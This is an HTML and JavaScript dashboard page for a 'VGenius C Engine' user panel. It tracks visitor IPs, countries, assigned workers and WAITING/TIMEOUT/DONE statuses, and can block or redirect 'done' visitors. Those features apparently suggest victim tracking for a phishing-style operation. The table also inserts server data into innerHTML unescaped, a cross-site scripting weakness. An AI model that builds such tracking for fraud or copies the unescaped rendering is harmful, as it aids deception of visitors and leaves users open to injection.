<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitors Analytics – VGenius C Engine</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="assets/css/user.css">
</head>
<body>
    <aside class="main-sidebar" id="mainSidebar"></aside>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
    <nav class="main-header navbar"></nav>

    <main class="content-wrapper">
        <div class="page-header">
            <div>
                <h1 class="page-title" style="margin:0;">Visitors Analytics</h1>
                <p style="color:var(--muted);font-size:12px;margin-top:4px;">Real-time visitor tracking and geographic insights.</p>
            </div>
        </div>

        <div class="access-settings-toggle" onclick="toggleAccessSettings()">
            <span><i class="fas fa-cog"></i> Visitor Access Settings</span>
            <span id="toggleArrow"><i class="fas fa-chevron-down"></i></span>
        </div>
        <div class="access-settings-body" id="accessSettingsBody">
            <label style="display:flex;align-items:center;gap:8px;font-size:13px;margin-bottom:12px;">
                <input type="checkbox" id="blockDoneVisitors" onchange="saveAccessSettings()"> Block visitors with Done status
            </label>
            <div class="form-group">
                <label>Redirect URL (leave empty to show blocked page)</label>
                <input type="text" id="redirectUrl" placeholder="https://google.com" onchange="saveAccessSettings()">
            </div>
            <button class="btn-accent-sm" onclick="saveAccessSettings()">Save</button>
        </div>

        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px;">
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-eye"></i></div><div class="stat-value" id="totalVisitors">0</div><div class="stat-label">Total Visitors</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-network-wired"></i></div><div class="stat-value" id="uniqueIps">0</div><div class="stat-label">Unique IPs</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-earth-americas"></i></div><div class="stat-value" id="countryCount">0</div><div class="stat-label">Countries</div></div>
            <div class="stat-card"><div class="stat-icon"><i class="fas fa-check-circle"></i></div><div class="stat-value" id="topCountry">—</div><div class="stat-label">Completed</div></div>
        </div>

        <!-- Chart Button -->
        <div style="margin-bottom:16px;display:flex;justify-content:flex-end;">
            <button class="btn-outline" onclick="openChartModal()"><i class="fas fa-chart-line"></i> View Chart</button>
        </div>

        <div class="legend">
            <span style="font-family:var(--font-heading);font-size:10px;color:var(--muted);">RECENT VISITORS</span>
            <div class="legend-item"><span class="legend-dot waiting"></span> WAITING</div>
            <div class="legend-item"><span class="legend-dot timeout"></span> TIMEOUT</div>
            <div class="legend-item"><span class="legend-dot done"></span> DONE</div>
        </div>

        <div class="filter-bar">
            <select id="countryFilter" onchange="loadVisitors()">
                <option value="">All Countries</option>
            </select>
            <button class="btn-danger-sm" onclick="clearAllVisitors()"><i class="fas fa-trash"></i> Clear All</button>
        </div>

        <div class="card" style="overflow:hidden;">
            <table class="visitors-table">
                <thead><tr><th>#</th><th>IP Address</th><th>Country</th><th>Worker</th><th>Status</th><th>Date</th><th></th></tr></thead>
                <tbody id="visitorsTableBody"><tr><td colspan="7" class="empty-state">No visitors recorded yet.</td></tr></tbody>
            </table>
        </div>
    </main>

    <!-- Chart Modal -->
    <div id="chartModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;align-items:center;justify-content:center;padding:20px;">
        <div style="background:var(--surface);border-radius:8px;width:100%;max-width:900px;max-height:90vh;overflow:hidden;display:flex;flex-direction:column;">
            <div style="padding:16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;">
                <h3 style="margin:0;font-family:var(--font-heading);">Visitor Analytics Chart</h3>
                <button onclick="closeChartModal()" style="background:none;border:none;color:var(--muted);font-size:20px;cursor:pointer;"><i class="fas fa-times"></i></button>
            </div>
            <div style="padding:16px;display:flex;gap:8px;margin-bottom:8px;" id="chartTabs">
                <button class="btn-outline" onclick="setChartTab(this, 7)">7 Days</button>
                <button class="btn-outline" onclick="setChartTab(this, 14)">14 Days</button>
                <button class="btn-outline" onclick="setChartTab(this, 30)">30 Days</button>
                <button class="btn-outline" onclick="setChartTab(this, 90)">90 Days</button>
            </div>
            <div style="padding:0 16px 16px;flex:1;min-height:400px;">
                <canvas id="visitorChart"></canvas>
            </div>
        </div>
    </div>

    <script src="assets/js/user.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <script>
        const token = getToken();
        if (!token) window.location.href = "/user-panel/index";
        let visitorChartInstance = null;
        let currentChartDays = 14;
        initShared('visitors');

        async function loadVisitors() {
            const country = document.getElementById('countryFilter').value;
            const res = await fetch(`${API}/analytics/visitors?country=${country}`, { headers: authHeaders() });
            const data = await res.json();
            document.getElementById('totalVisitors').textContent = data.stats.total;
            document.getElementById('uniqueIps').textContent = data.stats.unique_ips;
            document.getElementById('countryCount').textContent = data.stats.countries;
            document.getElementById('topCountry').textContent = data.stats.done + ' done';
            const tbody = document.getElementById('visitorsTableBody');
            if (!data.visitors.length) {
                tbody.innerHTML = '<tr><td colspan="7" class="empty-state"><i class="fas fa-inbox"></i>No visitors recorded yet.</td></tr>';
            } else {
                tbody.innerHTML = data.visitors.map((v, i) => `
                    <tr>
                        <td>${i+1}</td>
                        <td style="font-family:var(--font-heading);">${v.ip_address}</td>
                        <td>${v.country}</td>
                        <td>${v.worker_name || '—'}</td>
                        <td><span class="status-pill ${v.status}">${v.status.toUpperCase()}</span></td>
                        <td>${formatDate(v.created_at)}</td>
                        <td><button style="background:none;border:none;color:var(--danger);cursor:pointer;font-size:14px;" onclick="deleteVisitor(${v.id})"><i class="fas fa-trash"></i></button></td>
                    </tr>
                `).join('');
            }
        }

        async function deleteVisitor(id) { await fetch(`${API}/analytics/visitors/${id}`, { method: 'DELETE', headers: authHeaders() }); loadVisitors(); }
        async function clearAllVisitors() {
            showConfirm({
                title: 'Clear All Visitors',
                message: 'This will delete all visitor records. This action cannot be undone.',
                confirmText: 'Clear All',
                onConfirm: async () => {
                    await fetch(`${API}/analytics/visitors`, { method: 'DELETE', headers: authHeaders() });
                    loadVisitors();
                    showToast('All visitors cleared');
                }
            });
        }

        function toggleAccessSettings() {
            document.getElementById('accessSettingsBody').classList.toggle('open');
            const icon = document.querySelector('#toggleArrow i');
            icon.className = document.getElementById('accessSettingsBody').classList.contains('open') ? 'fas fa-chevron-up' : 'fas fa-chevron-down';
        }

        async function loadAccessSettings() {
            const res = await fetch(`${API}/user/visitors/settings`, { headers: authHeaders() });
            const data = await res.json();
            document.getElementById('blockDoneVisitors').checked = data.block_done_visitors;
            document.getElementById('redirectUrl').value = data.redirect_url || '';
        }

        async function saveAccessSettings() {
            await fetch(`${API}/user/visitors/settings`, { method: 'PUT', headers: authHeaders(), body: JSON.stringify({
                block_done_visitors: document.getElementById('blockDoneVisitors').checked,
                redirect_url: document.getElementById('redirectUrl').value,
            })});
            showToast('Settings saved');
        }

        // Chart Modal Functions
        function openChartModal() {
            document.getElementById('chartModal').style.display = 'flex';
            loadVisitorChart(currentChartDays);
        }

        function closeChartModal() {
            document.getElementById('chartModal').style.display = 'none';
        }

        async function loadVisitorChart(days) {
            currentChartDays = days;
            const res = await fetch(`${API}/analytics/visitors/daily?days=${days}`, { headers: authHeaders() });
            const data = await res.json();

            const ctx = document.getElementById('visitorChart');
            if (!ctx) return;

            if (visitorChartInstance) {
                visitorChartInstance.destroy();
            }

            const labels = data.map(d => d.date);
            const counts = data.map(d => d.count);
            const doneCounts = data.map(d => d.done_count || 0);

            visitorChartInstance = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: labels,
                    datasets: [
                        {
                            label: 'Total Visitors',
                            data: counts,
                            borderColor: '#00ffcc',
                            backgroundColor: 'rgba(0, 255, 204, 0.1)',
                            fill: true,
                            tension: 0.4,
                        },
                        {
                            label: 'Completed',
                            data: doneCounts,
                            borderColor: '#107C10',
                            backgroundColor: 'rgba(16, 124, 16, 0.1)',
                            fill: true,
                            tension: 0.4,
                        }
                    ]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            labels: { color: '#c6ffdd' }
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true,
                            ticks: { color: '#8aa39a' },
                            grid: { color: 'rgba(0, 255, 204, 0.08)' }
                        },
                        x: {
                            ticks: { color: '#8aa39a' },
                            grid: { color: 'rgba(0, 255, 204, 0.08)' }
                        }
                    }
                }
            });
        }

        function setChartTab(btn, days) {
            document.querySelectorAll('#chartTabs button').forEach(b => {
                b.className = 'btn-outline';
                b.style.padding = '6px 16px';
                b.style.fontSize = '10px';
            });
            btn.className = 'btn-accent-sm';
            btn.style.padding = '6px 16px';
            btn.style.fontSize = '10px';
            loadVisitorChart(days);
        }

        loadVisitors();
        loadAccessSettings();

        // Close chart modal on Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                const chartModal = document.getElementById('chartModal');
                if (chartModal) chartModal.style.display = 'none';
            }
        });
    </script>
</body>
</html>
